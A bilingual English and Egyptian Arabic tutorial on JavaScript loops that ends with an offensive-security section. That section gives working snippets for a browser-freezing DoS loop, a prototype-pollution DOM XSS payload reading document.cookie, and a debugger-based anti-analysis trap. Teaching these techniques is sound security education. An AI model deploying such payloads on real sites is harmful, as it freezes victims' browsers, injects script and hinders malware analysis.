
10. Loops in JavaScript

Definition:
Loops are used to execute a block of code repeatedly as long as a specified condition evaluates to `true`, or to iterate over data structures.

Types of Loops:
1. `while` loop: Evaluates the condition first, then executes the code block.
2. `do...while` loop: Executes the code block once first, then checks the condition.
3. `for` loop: Repeats code for a specific number of times (initialization; condition; increment).
4. `for...in` loop: Iterates over the enumerable properties (keys) of an Object or indices of an Array.
5. `for...of` loop: Iterates over the values of an iterable object (Arrays, Strings, Maps, Sets).

Control Statements:
- `break`: Terminates the loop completely.
- `continue`: Skips the current iteration and moves to the next one.


---

### (JS Core Concept)

التكرار (**Loops**) هي وسيلة بتسمحلك تنفذ كود معين أكتر من مرة من غير ما تكرر كتابته.

- **حلقة `while`:** بتتأكد من الشرط الأول؛ لو صح تنفذ الكود وتفضل تعيد لحد ما الشرط يبطل يتحقق.
    
- **حلقة `do...while`:** بتضمن إن الكود هيرن **مرة واحدة على الأقل** حتى لو الشرط غلط من الأول، وبعدين تتأكد من الشرط.
    
- **حلقة `for` العادية:** ممتازة لما تكون عارف عدد المرات اللي عايز تلف فيها (مثلاً من 1 لـ 10).
    
- **حلقة `for...in`:** مخصصة للَّف على **المفاتيح/الأسماء (Keys)** جوه الأوبجكت أو الفهارس (Indices) في المصفوفة.
    
- **حلقة `for...of`:** مخصصة للَّف على **القيم الحقيقية (Values)** جوه المصفوفات أو النصوص.
    
- **التحكم في التكرار:**
    
    - `break`: بتوقف اللوب فوراً وتخرج بره.
        
    - `continue`: بتعدي اللفة الحالية وبتنط على اللفة اللي بعدها.
        

### 3. 💻 مثال برمجي تقليدي (Standard Example)

JavaScript

```
// 1. Standard For Loop
for (let i = 0; i < 3; i++) {
    console.log("Count:", i);
}

// 2. For...in (Objects - Iterates Keys)
const user = { name: "silentn0va", role: "admin" };
for (let key in user) {
    console.log(key, "->", user[key]);
}

// 3. For...of (Arrays - Iterates Values)
const tools = ["BurpSuite", "Nmap", "Wireshark"];
for (let tool of tools) {
    console.log("Tool:", tool);
}
```

### 4. ⚔️ منظور الهكر (JS for Hackers)

في الـ Web Pentesting والـ Malware Analysis، الحلقات التكرارية بتلعب دور جوهري في الهجمات والتخفي:

1. **حجب الخدمة للعميل (Client-Side Denial of Service - DoS):**
    
    - كتابة حلقة تكرارية نهائية (`while(true)`) أو حسابات معقدة جوه Nested Loops بتستهلك الـ CPU ورام المتصفح بنسبة 100%.
        
    - ده بيؤدي لتجميد تبويب المتصفح (Browser Freeze/Crash) ومنع الضحية من استكمال تصفح الموقع أو عمل Log out.
        
2. **تسريع وتضخيم أثر Prototype Pollution بـ `for...in`:**
    
    - حلقة `for...in` مش بتلف على الخصائص الخاصة بالـ Object بس، دي بتلف كمان على **الخصائص المورثة من `Object.prototype`**!
        
    - لو المهاجم نجح يعمل Prototype Pollution، أي حلقة `for...in` في كود التطبيق هتمر على الخاصية الملوثة دي وتنفذ سيناريوهات DOM XSS أو كسر اللوجيك.
        
3. **تقنيات منع التحليل والـ Anti-Debugging:**
    
    - البرمجيات الخبيثة (JS Malware) وسكربتات التخفي بتشغل حلقة `while(true)` بيتفحص فيها باستمرار لو الـ Developer Tools مفتوحة (عبر حساب الوقت بـ `performance.now()` أو استدعاء `debugger;`). أول ما الديفيلوبر يفتح الـ Console، المتصفح بيعلق تماماً ويمنع التحليل.
        
4. **تجميع البيانات وتخمين المدخلات (Client-Side Brute Forcing & Fuzzing):**
    
    - الهكر بيستخدم الـ Loops لكتابة أدوات فحص سريعة جوه الـ Console لتخمين الـ Endpoints المخفية، أو تجربة قائمة طويلة من الأكواد والـ Tokens في الـ DOM مباشرة.
        

### 5. 🎯 أمثلة هجومية وسيناريوهات استغلال (PoC & Payloads)

#### 📌 السيناريو الأول: كراش المتصفح وسلسلة DoS عبر `while(true)`

حقن Payload بياخد الـ Focus ويحبس المتصفح في حلقة غير منتهية:

JavaScript

```
// Payload بسيط كفيل بتجميد تبويب المتصفح تماماً (Tab Crash)
while (true) {
    // فتح نافذة جافاسكريبت متكررة تحجب المتصفح
    history.pushState(null, null, location.href);
}
```

#### 📌 السيناريو الثاني: استغلال Prototype Pollution مع حلقة `for...in` لإحداث DOM XSS

تخيل تطبيق بياخد أوبجكت وبيلف عليه بـ `for...in` عشان يبني عناصر HTML:

JavaScript

```
// كود التطبيق الأصلي
function renderSettings(settings) {
    for (let prop in settings) {
        // المطور افترض إن prop ملك للأوبجكت settings فقط
        document.body.innerHTML += `<div id="${prop}">${settings[prop]}</div>`;
    }
}

// المهاجم لو نجح يلوث الـ Prototype سابقاً:
Object.prototype.xss = "<img src=x onerror=alert(document.cookie)>";

// عند استدعاء الدالة حتى مع أوبجكت فاضي:
renderSettings({}); 

// حلقة for...in ستلف على خاصية xss المورثة، ويحدث الـ DOM XSS فوراً!
```

#### 📌 السيناريو الثالث: حيلة Anti-Debugging تمنع المحلل من فحص الكود

كود خبيث بيستخدم `while` مع كلمة `debugger` لتعطيل الـ DevTools أول ما تفتح:

JavaScript

```
// كود بيمنع الهكر أو الـ Analyst إنه يعمل Inspect
setInterval(function() {
    let startTime = performance.now();
    
    // استدعاء المطور النقطة الميتة
    (function() {}.constructor("debugger")());
    
    let endTime = performance.now();
    
    // لو الـ DevTools مفتوحة، وقت التنفيذ هيطول جداً
    if (endTime - startTime > 100) {
        // حظر الصفحة أو إدخال المتصفح في حلقة تجميد infinite loop
        while(true) {} 
    }
}, 500);
```
